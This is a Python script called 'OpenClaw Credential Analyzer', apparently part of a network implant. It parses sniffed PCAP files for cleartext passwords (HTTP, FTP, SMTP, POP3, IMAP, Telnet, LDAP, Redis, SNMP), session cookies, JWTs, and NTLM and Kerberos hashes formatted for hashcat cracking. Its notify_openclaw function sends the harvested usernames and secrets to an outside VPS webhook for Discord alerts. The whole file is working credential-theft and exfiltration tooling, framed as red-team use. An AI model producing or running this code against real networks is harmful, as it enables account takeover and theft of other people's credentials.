#!/usr/bin/env python3
"""
OpenClaw Credential Analyzer
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Scans PCAP files produced by the packet-sniffer service for credentials,
hashes, and tokens useful during red-team engagements.

Runs every 60 s via systemd timer.  Only processes *new* data (tracks
file sizes between runs).  Deduplicates findings across invocations.

Findings are appended to a JSON file and pushed to the VPS-side OpenClaw
webhook for real-time Discord alerts.
"""

from __future__ import annotations

import base64
import hashlib
import json
import os
import re
import struct
import subprocess
import sys
import time
from datetime import datetime, timezone

# ---------------------------------------------------------------------------
# Paths (sourced from config.env at runtime via EnvironmentFile)
# ---------------------------------------------------------------------------

SNIFFER_LOG_DIR = os.environ.get(
    "SNIFFER_LOG_DIR", "/opt/implant/logs/packet-sniffer"
)
CRED_ANALYZER_LOG_DIR = os.environ.get(
    "CRED_ANALYZER_LOG_DIR", "/opt/implant/logs/cred-analyzer"
)
STATE_FILE = os.path.join(CRED_ANALYZER_LOG_DIR, "state.json")
FINDINGS_FILE = os.path.join(CRED_ANALYZER_LOG_DIR, "findings.json")
LOG_FILE = os.path.join(CRED_ANALYZER_LOG_DIR, "cred-analyzer.log")


# ---------------------------------------------------------------------------
# State management
# ---------------------------------------------------------------------------

def load_state() -> dict:
    if os.path.isfile(STATE_FILE):
        with open(STATE_FILE) as f:
            return json.load(f)
    return {"files": {}, "seen": []}


def save_state(state: dict) -> None:
    tmp = STATE_FILE + ".tmp"
    with open(tmp, "w") as f:
        json.dump(state, f)
    os.replace(tmp, STATE_FILE)


def load_findings() -> list:
    if os.path.isfile(FINDINGS_FILE):
        with open(FINDINGS_FILE) as f:
            data = json.load(f)
        # Support both old (flat list) and new (wrapped) format
        if isinstance(data, dict):
            return data.get("findings", [])
        return data
    return []


def save_findings(findings: list) -> None:
    from collections import Counter
    by_type = dict(Counter(f["type"] for f in findings))
    by_protocol = dict(Counter(f["protocol"] for f in findings))
    doc = {
        "last_updated": datetime.now(timezone.utc).isoformat(),
        "total_count": len(findings),
        "by_type": by_type,
        "by_protocol": by_protocol,
        "findings": findings,
    }
    tmp = FINDINGS_FILE + ".tmp"
    with open(tmp, "w") as f:
        json.dump(doc, f, indent=2)
    os.replace(tmp, FINDINGS_FILE)


def finding_hash(finding: dict) -> str:
    """Deterministic hash for deduplication."""
    key = f"{finding['type']}|{finding['protocol']}|{finding.get('username', '')}|{finding.get('secret', '')}"
    return hashlib.sha256(key.encode()).hexdigest()[:16]


# ---------------------------------------------------------------------------
# Packet-sniffer service check
# ---------------------------------------------------------------------------

def is_sniffer_active() -> bool:
    try:
        r = subprocess.run(
            ["systemctl", "is-active", "packet-sniffer"],
            capture_output=True, text=True, timeout=5,
        )
        return r.stdout.strip() == "active"
    except Exception:
        return False


# ---------------------------------------------------------------------------
# PCAP file discovery
# ---------------------------------------------------------------------------

def get_pcap_files() -> list[str]:
    """Return all .pcap* files in the sniffer log directory."""
    if not os.path.isdir(SNIFFER_LOG_DIR):
        return []
    files = []
    for name in os.listdir(SNIFFER_LOG_DIR):
        if ".pcap" in name:
            files.append(os.path.join(SNIFFER_LOG_DIR, name))
    return sorted(files)


def file_changed(path: str, state: dict) -> bool:
    """Check if a PCAP file has new data since last run."""
    try:
        st = os.stat(path)
    except OSError:
        return False
    key = os.path.basename(path)
    prev = state["files"].get(key, {})
    return st.st_size != prev.get("size", 0) or st.st_mtime != prev.get("mtime", 0)


def update_file_state(path: str, state: dict) -> None:
    st = os.stat(path)
    key = os.path.basename(path)
    state["files"][key] = {"size": st.st_size, "mtime": st.st_mtime}


# ---------------------------------------------------------------------------
# Protocol parsers
# ---------------------------------------------------------------------------
# Each parser takes raw packet bytes (IP payload and below) and returns
# a list of finding dicts.  We do minimal parsing without importing scapy
# at the top level so the script stays lightweight on the Pi.

def _safe_decode(data: bytes) -> str:
    """Best-effort decode bytes to string."""
    try:
        return data.decode("utf-8", errors="replace")
    except Exception:
        return data.decode("latin-1", errors="replace")


def _ip_str(raw: bytes) -> str:
    return ".".join(str(b) for b in raw)


def _make_finding(
    ftype: str, protocol: str, src: str, dst: str,
    username: str = "", secret: str = "", details: str = "",
) -> dict:
    return {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "type": ftype,
        "protocol": protocol,
        "src": src,
        "dst": dst,
        "username": username,
        "secret": secret,
        "details": details,
    }


# ---- HTTP ----------------------------------------------------------------

_AUTH_BASIC_RE = re.compile(rb"Authorization:\s*Basic\s+([A-Za-z0-9+/=]+)", re.I)
_AUTH_BEARER_RE = re.compile(rb"Authorization:\s*Bearer\s+(\S+)", re.I)
_HTTP_HOST_RE = re.compile(rb"Host:\s*(\S+)", re.I)
_FORM_FIELDS_RE = re.compile(
    rb"(?:user(?:name)?|login|email|pass(?:word|wd)?|passwd|pwd|token|"
    rb"session|secret|credential|auth)=([^&\s]+)",
    re.I,
)
_COOKIE_RE = re.compile(rb"Cookie:\s*(.+?)(?:\r\n|\r|\n)", re.I)
_SET_COOKIE_RE = re.compile(rb"Set-Cookie:\s*(.+?)(?:\r\n|\r|\n)", re.I)
_SESSION_COOKIE_NAMES = {
    b"jsessionid", b"phpsessid", b"asp.net_sessionid", b"connect.sid",
    b"session", b"sessionid", b"sid", b"_session", b"token",
    b"auth_token", b"access_token",
}
_JWT_RE = re.compile(rb"eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]+")


def parse_http(payload: bytes, src: str, dst: str) -> list[dict]:
    findings = []
    text = payload

    host_m = _HTTP_HOST_RE.search(text)
    host = _safe_decode(host_m.group(1)) if host_m else ""

    # Basic Auth
    m = _AUTH_BASIC_RE.search(text)
    if m:
        try:
            decoded = base64.b64decode(m.group(1)).decode("utf-8", errors="replace")
            if ":" in decoded:
                user, passwd = decoded.split(":", 1)
                findings.append(_make_finding(
                    "cleartext", "HTTP Basic Auth", src, dst,
                    username=user, secret=passwd,
                    details=f"Host: {host}",
                ))
        except Exception:
            pass

    # Bearer / JWT
    m = _AUTH_BEARER_RE.search(text)
    if m:
        token = _safe_decode(m.group(1))
        jwt_m = _JWT_RE.search(m.group(1))
        proto = "HTTP JWT" if jwt_m else "HTTP Bearer Token"
        details = f"Host: {host}"
        if jwt_m:
            try:
                hdr_b64 = jwt_m.group(0).split(b".")[1]
                # Pad base64url
                padded = hdr_b64 + b"=" * (4 - len(hdr_b64) % 4)
                body = base64.urlsafe_b64decode(padded)
                details += f" | JWT payload: {_safe_decode(body)[:200]}"
            except Exception:
                pass
        findings.append(_make_finding(
            "token", proto, src, dst,
            secret=token[:500], details=details,
        ))

    # Form POST credentials
    if text[:4] == b"POST":
        matches = _FORM_FIELDS_RE.findall(text)
        if len(matches) >= 2:
            # Try to pair username + password fields
            from urllib.parse import unquote
            vals = [unquote(_safe_decode(v)) for v in matches]
            findings.append(_make_finding(
                "cleartext", "HTTP Form POST", src, dst,
                username=vals[0], secret=vals[1] if len(vals) > 1 else "",
                details=f"Host: {host} | Fields: {len(matches)} params",
            ))

    # Session cookies
    for cookie_re in (_COOKIE_RE, _SET_COOKIE_RE):
        cm = cookie_re.search(text)
        if cm:
            cookie_str = cm.group(1).lower()
            for name in _SESSION_COOKIE_NAMES:
                if name in cookie_str:
                    findings.append(_make_finding(
                        "token", "HTTP Session Cookie", src, dst,
                        secret=_safe_decode(cm.group(1))[:300],
                        details=f"Host: {host} | Matched: {name.decode()}",
                    ))
                    break

    return findings


# ---- FTP -----------------------------------------------------------------

def parse_ftp(payload: bytes, src: str, dst: str, sessions: dict) -> list[dict]:
    """FTP sends USER and PASS as separate TCP packets.
    Track USER in ``sessions`` and emit a finding when PASS arrives."""
    findings = []
    text = _safe_decode(payload)
    lines = text.split("\r\n") if "\r\n" in text else text.split("\n")

    for line in lines:
        upper = line.upper()
        if upper.startswith("USER "):
            user = line[5:].strip()
            if user:
                # Store username keyed by client->server connection
                sessions[f"ftp|{src}|{dst}"] = user
        elif upper.startswith("PASS "):
            passwd = line[5:].strip()
            key = f"ftp|{src}|{dst}"
            user = sessions.pop(key, "")
            if user or passwd:
                findings.append(_make_finding(
                    "cleartext", "FTP", src, dst,
                    username=user, secret=passwd,
                ))

    return findings


# ---- SMTP ----------------------------------------------------------------

def parse_smtp(payload: bytes, src: str, dst: str) -> list[dict]:
    findings = []
    text = _safe_decode(payload)

    # AUTH PLAIN: base64(\0username\0password)
    m = re.search(r"AUTH PLAIN\s+(\S+)", text, re.I)
    if m:
        try:
            decoded = base64.b64decode(m.group(1)).decode("utf-8", errors="replace")
            parts = decoded.split("\x00")
            if len(parts) >= 3:
                findings.append(_make_finding(
                    "cleartext", "SMTP AUTH PLAIN", src, dst,
                    username=parts[1], secret=parts[2],
                ))
        except Exception:
            pass

    # AUTH LOGIN: next two lines are base64 user and pass
    if "AUTH LOGIN" in text.upper():
        lines = text.strip().split("\r\n") if "\r\n" in text else text.strip().split("\n")
        b64_parts = []
        capture = False
        for line in lines:
            if "AUTH LOGIN" in line.upper():
                capture = True
                # Check if credentials follow on same line
                parts = line.split()
                if len(parts) > 2:
                    b64_parts.append(parts[2])
                continue
            if capture and line.strip() and not line.startswith(("2", "3")):
                b64_parts.append(line.strip())
                if len(b64_parts) >= 2:
                    break
        if len(b64_parts) >= 2:
            try:
                user = base64.b64decode(b64_parts[0]).decode("utf-8", errors="replace")
                passwd = base64.b64decode(b64_parts[1]).decode("utf-8", errors="replace")
                findings.append(_make_finding(
                    "cleartext", "SMTP AUTH LOGIN", src, dst,
                    username=user, secret=passwd,
                ))
            except Exception:
                pass

    return findings


# ---- POP3 ----------------------------------------------------------------

def parse_pop3(payload: bytes, src: str, dst: str, sessions: dict) -> list[dict]:
    """POP3 sends USER and PASS as separate TCP packets (same as FTP)."""
    findings = []
    text = _safe_decode(payload)
    lines = text.split("\r\n") if "\r\n" in text else text.split("\n")

    for line in lines:
        upper = line.upper()
        if upper.startswith("USER "):
            user = line[5:].strip()
            if user:
                sessions[f"pop3|{src}|{dst}"] = user
        elif upper.startswith("PASS "):
            passwd = line[5:].strip()
            key = f"pop3|{src}|{dst}"
            user = sessions.pop(key, "")
            if user or passwd:
                findings.append(_make_finding(
                    "cleartext", "POP3", src, dst,
                    username=user, secret=passwd,
                ))

    return findings


# ---- IMAP ----------------------------------------------------------------

def parse_imap(payload: bytes, src: str, dst: str) -> list[dict]:
    findings = []
    text = _safe_decode(payload)
    # IMAP LOGIN: tag LOGIN username password
    m = re.search(r'\S+\s+LOGIN\s+"?([^"\s]+)"?\s+"?([^"\s]+)"?', text, re.I)
    if m:
        findings.append(_make_finding(
            "cleartext", "IMAP LOGIN", src, dst,
            username=m.group(1), secret=m.group(2),
        ))
    return findings


# ---- Telnet (basic) ------------------------------------------------------

def parse_telnet(payload: bytes, src: str, dst: str) -> list[dict]:
    # Telnet is tricky (character-at-a-time). We look for login/password
    # prompts followed by data in the same or next packet.
    findings = []
    text = _safe_decode(payload)
    m = re.search(r"(?:login|username)[\s:]+(\S+)", text, re.I)
    if m:
        user = m.group(1)
        pm = re.search(r"password[\s:]+(\S+)", text, re.I)
        passwd = pm.group(1) if pm else ""
        findings.append(_make_finding(
            "cleartext", "Telnet", src, dst,
            username=user, secret=passwd,
        ))
    return findings


# ---- LDAP Simple Bind ----------------------------------------------------

def parse_ldap(payload: bytes, src: str, dst: str) -> list[dict]:
    findings = []
    # Simple LDAP bind: look for BER-encoded BindRequest
    # Sequence -> Application[0] -> version, name (DN), Simple auth
    # We use a heuristic: look for printable strings that resemble DN + password
    if len(payload) < 10:
        return findings

    try:
        # LDAP bind request: 0x30 (sequence), then 0x60 (bind request app tag)
        if b"\x60" in payload:
            idx = payload.index(b"\x60")
            rest = payload[idx:]
            # Extract strings from the BER payload
            strings = re.findall(rb"[\x04](.{1,255}?)(?:\x80|\xa3|\x04|\x30)", rest)
            printable = []
            for s in strings:
                try:
                    decoded = s.decode("utf-8")
                    if len(decoded) > 1 and decoded.isprintable():
                        printable.append(decoded)
                except Exception:
                    continue
            if len(printable) >= 2:
                findings.append(_make_finding(
                    "cleartext", "LDAP Simple Bind", src, dst,
                    username=printable[0], secret=printable[1],
                    details="Extracted from BER-encoded BindRequest",
                ))
    except Exception:
        pass
    return findings


# ---- SNMP v1/v2c community string ----------------------------------------

def parse_snmp(payload: bytes, src: str, dst: str) -> list[dict]:
    findings = []
    # SNMP v1/v2c: Sequence -> version (int) -> community (octet string)
    if len(payload) < 10 or payload[0] != 0x30:
        return findings
    try:
        # Skip outer sequence tag + length
        i = 2 if payload[1] < 0x80 else 2 + (payload[1] & 0x7F)
        # Version: 0x02 (integer tag), length, value
        if payload[i] == 0x02:
            vlen = payload[i + 1]
            version = payload[i + 2]
            i += 2 + vlen
            # Community: 0x04 (octet string tag), length, value
            if i < len(payload) and payload[i] == 0x04:
                clen = payload[i + 1]
                community = payload[i + 2:i + 2 + clen]
                cs = _safe_decode(community)
                if cs and cs.isprintable() and len(cs) > 0:
                    findings.append(_make_finding(
                        "cleartext", "SNMP Community String", src, dst,
                        secret=cs,
                        details=f"SNMP v{version + 1}",
                    ))
    except Exception:
        pass
    return findings


# ---- Database protocols ---------------------------------------------------

def parse_databases(payload: bytes, src: str, dst: str) -> list[dict]:
    findings = []
    text = _safe_decode(payload)

    # Redis AUTH
    if payload[:5].upper() in (b"*2\r\nA", b"AUTH "):
        m = re.search(r"AUTH\s+(\S+)", text, re.I)
        if m:
            findings.append(_make_finding(
                "cleartext", "Redis AUTH", src, dst,
                secret=m.group(1),
            ))

    # MySQL HandshakeResponse: look for username after capabilities
    if len(payload) > 36 and payload[4:5] in (b"\x85", b"\x8d", b"\x0d"):
        try:
            # Skip header bytes, find null-terminated username
            for offset in range(32, min(len(payload), 100)):
                if payload[offset] == 0x00:
                    user = payload[32:offset]
                    if user and all(32 <= b < 127 for b in user):
                        findings.append(_make_finding(
                            "cleartext", "MySQL Login", src, dst,
                            username=user.decode("ascii"),
                            details="Username from HandshakeResponse packet",
                        ))
                    break
        except Exception:
            pass

    # PostgreSQL StartupMessage: look for "user" parameter
    if len(payload) > 8 and payload[4:8] == b"\x00\x03\x00\x00":
        try:
            params = payload[8:].split(b"\x00")
            for idx, p in enumerate(params):
                if p == b"user" and idx + 1 < len(params):
                    findings.append(_make_finding(
                        "cleartext", "PostgreSQL Login", src, dst,
                        username=params[idx + 1].decode("utf-8", errors="replace"),
                    ))
                    break
        except Exception:
            pass

    return findings


# ---- NTLM (from any protocol using NTLMSSP) -----------------------------

_NTLMSSP_SIG = b"NTLMSSP\x00"


def parse_ntlm(payload: bytes, src: str, dst: str, challenges: dict) -> list[dict]:
    """
    Extract NTLM challenge-response hashes from NTLMSSP messages.
    ``challenges`` is a mutable dict mapping (src_ip, dst_ip) to the
    server challenge bytes --- shared across packets in one PCAP pass.
    """
    findings = []
    idx = payload.find(_NTLMSSP_SIG)
    if idx == -1:
        return findings

    ntlm = payload[idx:]
    if len(ntlm) < 12:
        return findings

    msg_type = struct.unpack_from("<I", ntlm, 8)[0]

    if msg_type == 2:
        # Type 2 -- Challenge message: store the server challenge
        if len(ntlm) >= 32:
            challenge = ntlm[24:32]
            # Key by the connection endpoints (server sends challenge)
            challenges[(dst, src)] = challenge.hex()

    elif msg_type == 3:
        # Type 3 -- Authenticate message: extract hash
        if len(ntlm) < 72:
            return findings
        try:
            # LmChallengeResponse
            lm_len = struct.unpack_from("<H", ntlm, 12)[0]
            lm_off = struct.unpack_from("<I", ntlm, 16)[0]
            # NtChallengeResponse
            nt_len = struct.unpack_from("<H", ntlm, 20)[0]
            nt_off = struct.unpack_from("<I", ntlm, 24)[0]
            # Domain
            dom_len = struct.unpack_from("<H", ntlm, 28)[0]
            dom_off = struct.unpack_from("<I", ntlm, 32)[0]
            # User
            usr_len = struct.unpack_from("<H", ntlm, 36)[0]
            usr_off = struct.unpack_from("<I", ntlm, 40)[0]

            domain = ntlm[dom_off:dom_off + dom_len].decode("utf-16-le", errors="replace")
            user = ntlm[usr_off:usr_off + usr_len].decode("utf-16-le", errors="replace")
            nt_resp = ntlm[nt_off:nt_off + nt_len]

            challenge_hex = challenges.get((src, dst), "0000000000000000")

            if nt_len > 24:
                # NTLMv2
                nt_proof = nt_resp[:16].hex()
                nt_blob = nt_resp[16:].hex()
                hashcat_str = f"{user}::{domain}:{challenge_hex}:{nt_proof}:{nt_blob}"
                findings.append(_make_finding(
                    "ntlm_hash", "NetNTLMv2", src, dst,
                    username=user, secret=hashcat_str,
                    details=f"Domain: {domain} | hashcat -m 5600",
                ))
            elif nt_len == 24:
                # NTLMv1
                nt_hex = nt_resp.hex()
                lm_resp = ntlm[lm_off:lm_off + lm_len]
                lm_hex = lm_resp.hex()
                hashcat_str = f"{user}::{domain}:{lm_hex}:{nt_hex}:{challenge_hex}"
                findings.append(_make_finding(
                    "ntlm_hash", "NetNTLMv1", src, dst,
                    username=user, secret=hashcat_str,
                    details=f"Domain: {domain} | hashcat -m 5500",
                ))
        except Exception:
            pass

    return findings


# ---- Kerberos ------------------------------------------------------------

def parse_kerberos(payload: bytes, src: str, dst: str) -> list[dict]:
    """Extract AS-REP and TGS-REP hashes for offline cracking."""
    findings = []
    if len(payload) < 20:
        return findings

    # Kerberos uses ASN.1 DER.  We look for application tags:
    # AS-REP  = 0x6B (application 11)
    # TGS-REP = 0x6D (application 13)
    # AS-REQ  = 0x6A (application 10) -- extract principal for roasting candidates

    for tag, label in [(0x6B, "AS-REP"), (0x6D, "TGS-REP"), (0x6A, "AS-REQ")]:
        idx = -1
        try:
            idx = payload.index(bytes([tag]))
        except ValueError:
            continue

        rest = payload[idx:]

        if tag == 0x6A:
            # AS-REQ -- extract client principal name as roasting candidate
            # Look for principal name strings in the ASN.1
            strings = re.findall(rb"[\x1b][\x03-\x40]([\x20-\x7e]{2,64})", rest)
            if strings:
                principal = _safe_decode(strings[0])
                findings.append(_make_finding(
                    "kerberos", "AS-REQ (roasting candidate)", src, dst,
                    username=principal,
                    details="Pre-auth request -- may be AS-REP roastable if pre-auth disabled",
                ))

        elif tag in (0x6B, 0x6D):
            # AS-REP or TGS-REP -- extract encrypted part
            # Look for etype (encryption type) in the enc-part
            # etype 23 (RC4) = crackable
            # etype 17/18 (AES) = also crackable but slower
            enc_data = rest.hex()
            # Find realm and principal strings
            strings = re.findall(rb"[\x1b][\x03-\x40]([\x20-\x7e]{2,64})", rest)
            realm = _safe_decode(strings[0]) if len(strings) > 0 else "UNKNOWN"
            principal = _safe_decode(strings[1]) if len(strings) > 1 else "unknown"

            # Check for etype 23 (0x17) -- RC4, most common crackable type
            if b"\xa0\x03\x02\x01\x17" in rest:
                # etype 23 -- extract cipher
                cipher_start = rest.find(b"\xa2")
                if cipher_start != -1:
                    cipher_hex = rest[cipher_start:cipher_start + 200].hex()
                    if tag == 0x6B:
                        hashcat_mode = "18200"
                        hash_str = f"$krb5asrep$23${principal}@{realm}:{cipher_hex}"
                    else:
                        hashcat_mode = "13100"
                        hash_str = f"$krb5tgs$23$*{principal}${realm}*${cipher_hex}"
                    findings.append(_make_finding(
                        "kerberos", label, src, dst,
                        username=principal,
                        secret=hash_str[:500],
                        details=f"Realm: {realm} | etype: 23 (RC4) | hashcat -m {hashcat_mode}",
                    ))

    return findings


# ---------------------------------------------------------------------------
# Main packet processor
# ---------------------------------------------------------------------------

# Port -> parser mapping for TCP
_TCP_PARSERS = {
    21: parse_ftp,
    23: parse_telnet,
    25: parse_smtp,
    80: parse_http,
    110: parse_pop3,
    143: parse_imap,
    389: parse_ldap,
    587: parse_smtp,
    3306: parse_databases,
    5432: parse_databases,
    6379: parse_databases,
    8080: parse_http,
    8443: None,  # Skip -- this is the implant's own API
    8888: parse_http,
}

# Ports that should be parsed as HTTP regardless (web servers on odd ports)
_HTTP_INDICATORS = (b"HTTP/", b"GET ", b"POST ", b"PUT ", b"DELETE ", b"HEAD ")

# Ports whose parsers need session tracking across packets (USER/PASS split)
_STATEFUL_PORTS = {21, 110}


def process_pcap(filepath: str, state: dict, seen: set) -> list[dict]:
    """
    Parse a single PCAP file and return new credential findings.
    Uses scapy for robust PCAP reading.
    """
    from scapy.all import PcapReader, IP, TCP, UDP, Raw, conf

    # Suppress scapy warnings
    conf.verb = 0

    findings = []
    ntlm_challenges = {}  # Track NTLM challenges for response correlation
    sessions = {}         # Track multi-packet credential exchanges (FTP, POP3)

    try:
        reader = PcapReader(filepath)
    except Exception:
        return findings

    try:
        for pkt in reader:
            if not pkt.haslayer(IP):
                continue

            ip = pkt[IP]
            src_ip = ip.src
            dst_ip = ip.dst

            if pkt.haslayer(TCP) and pkt.haslayer(Raw):
                tcp = pkt[TCP]
                raw = bytes(pkt[Raw].load)
                sport = tcp.sport
                dport = tcp.dport
                src = f"{src_ip}:{sport}"
                dst = f"{dst_ip}:{dport}"

                pkt_findings = []

                # Check destination port for known protocol
                parser = _TCP_PARSERS.get(dport)
                if parser:
                    if dport in _STATEFUL_PORTS:
                        pkt_findings.extend(parser(raw, src, dst, sessions))
                    else:
                        pkt_findings.extend(parser(raw, src, dst))

                # Check source port (server responses)
                parser = _TCP_PARSERS.get(sport)
                if parser:
                    if sport in _STATEFUL_PORTS:
                        pkt_findings.extend(parser(raw, src, dst, sessions))
                    else:
                        pkt_findings.extend(parser(raw, src, dst))

                # HTTP on non-standard ports
                if not pkt_findings and any(raw.startswith(ind) for ind in _HTTP_INDICATORS):
                    pkt_findings.extend(parse_http(raw, src, dst))

                # NTLM in any TCP stream
                if _NTLMSSP_SIG in raw:
                    pkt_findings.extend(parse_ntlm(raw, src, dst, ntlm_challenges))

                # Kerberos over TCP (port 88)
                if dport == 88 or sport == 88:
                    pkt_findings.extend(parse_kerberos(raw, src, dst))

                # JWT anywhere in the payload
                jwt_match = _JWT_RE.search(raw)
                if jwt_match and not any(f["type"] == "token" for f in pkt_findings):
                    token = _safe_decode(jwt_match.group(0))
                    pkt_findings.append(_make_finding(
                        "token", "JWT Token", src, dst,
                        secret=token[:500],
                    ))

                # Deduplicate
                for f in pkt_findings:
                    h = finding_hash(f)
                    if h not in seen:
                        f["hash"] = h
                        findings.append(f)
                        seen.add(h)

            elif pkt.haslayer(UDP) and pkt.haslayer(Raw):
                udp = pkt[UDP]
                raw = bytes(pkt[Raw].load)
                sport = udp.sport
                dport = udp.dport
                src = f"{src_ip}:{sport}"
                dst = f"{dst_ip}:{dport}"

                pkt_findings = []

                # SNMP
                if dport in (161, 162) or sport in (161, 162):
                    pkt_findings.extend(parse_snmp(raw, src, dst))

                # Kerberos over UDP
                if dport == 88 or sport == 88:
                    pkt_findings.extend(parse_kerberos(raw, src, dst))

                # NTLM (rare over UDP, but possible)
                if _NTLMSSP_SIG in raw:
                    pkt_findings.extend(parse_ntlm(raw, src, dst, ntlm_challenges))

                for f in pkt_findings:
                    h = finding_hash(f)
                    if h not in seen:
                        f["hash"] = h
                        findings.append(f)
                        seen.add(h)

    except Exception:
        pass
    finally:
        reader.close()

    # Flush incomplete sessions (USER captured without corresponding PASS)
    for key, user in sessions.items():
        parts = key.split("|", 2)
        if len(parts) == 3:
            proto, s, d = parts
            f = _make_finding(
                "cleartext", proto.upper(), s, d,
                username=user, secret="",
                details="Username captured; password not seen in traffic",
            )
            h = finding_hash(f)
            if h not in seen:
                f["hash"] = h
                findings.append(f)
                seen.add(h)

    return findings


# ---------------------------------------------------------------------------
# OpenClaw webhook notification
# ---------------------------------------------------------------------------

def notify_openclaw(findings: list[dict]) -> None:
    """Push new credential findings to the VPS OpenClaw webhook."""
    # Kill-switch for credential notifications
    if os.environ.get("OPENCLAW_NOTIFY_CREDS", "yes").lower() != "yes":
        return

    url = os.environ.get("OPENCLAW_WEBHOOK_URL", "")
    token = os.environ.get("OPENCLAW_WEBHOOK_TOKEN", "")
    channel = os.environ.get("OPENCLAW_ALERT_CHANNEL_ID", "")
    implant_ip = os.environ.get("IMPLANT_WG_IP", "unknown")

    if not url or not token:
        return

    try:
        import requests as _req
    except ImportError:
        return

    # Plain data -- formatting is handled by the cred-sniffer skill on VPS
    entries = []
    for f in findings:
        parts = [f"protocol={f['protocol']}", f"type={f['type']}"]
        if f.get("username"):
            parts.append(f"user={f['username']}")
        if f.get("secret"):
            parts.append(f"secret={f['secret'][:120]}")
        parts.append(f"src={f['src']}")
        parts.append(f"dst={f['dst']}")
        if f.get("details"):
            parts.append(f"details={f['details']}")
        entries.append(" | ".join(parts))

    message = f"cred-alert: implant={implant_ip} count={len(findings)}\n" + "\n".join(entries)

    payload = {
        "message": message,
        "name": "cred-analyzer",
        "sessionKey": "hook:cred-alert",
        "deliver": True,
        "channel": "discord",
        "to": channel,
    }

    try:
        _req.post(
            url, json=payload,
            headers={"Authorization": f"Bearer {token}"},
            timeout=15, verify=False,
        )
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main() -> None:
    os.makedirs(CRED_ANALYZER_LOG_DIR, exist_ok=True)

    # Set up file logging for debugging
    import logging
    logging.basicConfig(
        filename=LOG_FILE,
        level=logging.INFO,
        format="%(asctime)s - %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    )
    logging.info("cred-analyzer started")

    # Check packet-sniffer is running
    if not is_sniffer_active():
        return

    state = load_state()
    seen = set(state.get("seen", []))
    existing_findings = load_findings()

    pcap_files = get_pcap_files()
    if not pcap_files:
        return

    new_findings = []
    for pcap in pcap_files:
        if not file_changed(pcap, state):
            continue

        results = process_pcap(pcap, state, seen)
        new_findings.extend(results)
        update_file_state(pcap, state)

    if new_findings:
        existing_findings.extend(new_findings)
        save_findings(existing_findings)
        # Push new findings to VPS via OpenClaw webhook
        notify_openclaw(new_findings)
        import logging
        logging.info(f"Found {len(new_findings)} new credentials, total: {len(existing_findings)}")

    # Update seen set in state
    state["seen"] = list(seen)
    save_state(state)


if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        # Never crash -- we run on a timer
        import logging
        logging.exception(f"cred-analyzer fatal: {e}")
        sys.stderr.write(f"cred-analyzer error: {e}\n")
